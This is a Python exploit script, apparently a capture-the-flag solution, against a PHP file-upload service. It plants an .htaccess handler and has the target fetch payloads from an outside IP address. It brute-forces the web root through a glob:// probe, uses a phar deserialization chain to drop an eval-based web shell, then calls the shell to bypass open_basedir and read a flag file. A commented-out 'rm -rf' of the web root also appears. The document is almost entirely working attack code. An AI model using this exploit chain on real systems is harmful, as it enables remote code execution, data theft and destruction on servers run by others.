import requests
import os

with open('htaccess','w') as f:
    f.write('AddHandler php7-script .txt\n')
print('[*] your file htaccess is create')
os.popen('mv htaccess /var/www/html/1')

headers = {'User-Agent':'poc_from_lou00'}

url = 'http://127.0.0.1:8001/'

webroot=''
upload=''
for i in range (0,3):
    data = {
        'action':'upload',
        'url':'http://118.24.3.214/1',
        'filename': str(i)
    }
    r = requests.post(url,data=data,headers=headers)
    upload = r.text.split('upload/')[1]

print('[*] upload  is ' + upload)

temp = '1234567890abcdefghijklmnopqrstuvwxyz'
for j in range(16):
    for i in temp:
        data = {
            'action':'count',
            'url':'1',
            'filename':'1',
            'dir':'glob:///var/www/html/'+webroot + i+'*/upload/'+upload+'/*'
        }
        r = requests.post(url,data=data,headers=headers)
        if "don't" not in r.text:
            webroot += i
            print(webroot)
            break
print('[*] webroot is ' + webroot)

data = {
    'action':'upload',
    'url':'http://118.24.3.214/1',
    'filename': '.htaccess'
}
r = requests.post(url,data=data,headers=headers)

data = {
    'action':'upload',
    'url':'http://118.24.3.214/1',
    'filename': '<?php echo 1.1;eval($_GET["a"]);'
}
r = requests.post(url,data=data,headers=headers)
php = '''<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($usedir,$url,$filename){
	$this->userdir = $usedir;
	$this->url = $url;
	$this->filename = $filename;
    }
}
$a = new dir('upload/%s','','');
$b = new dir($a,'','/var/www/html/%s/upload/%s/2');
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();?>;");
$phar->setMetadata($b);
$phar->addFromString("test.txt", "test");

$phar->stopBuffering();
echo urlencode(serialize($b));'''%(upload,webroot,upload)
with open('phar.php','w') as f:
    f.write(php)
print('[*] your file phar.php is create')
os.popen('php phar.php','r',1)
os.popen('mv phar.phar /var/www/html')
print('[*] your file phar.phar is create')

data = {
    'action':'upload',
    'url':'http://118.24.3.214/phar.phar',
    'filename': '1.jpg'
}
r = requests.post(url,data=data,headers=headers)
print('[*] your file phar.phar is upload')

data = {
    'action':'upload',
    'url':'phar://upload/'+upload+'/1.jpg',
    'filename': '2.jpg'
}
print('[*] shell is in upload/'+upload+'/2.txt')

r = requests.post(url,data=data,headers=headers)


r = requests.get(url+'upload/'+upload+'/2.txt?a=chdir(%27..%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(file_get_contents(%27F1aG_1s_H4r4%27));',headers=headers)
print(r.text)

# os.popen('rm -rf /var/www/html/*')
# print('[*] your file is delate')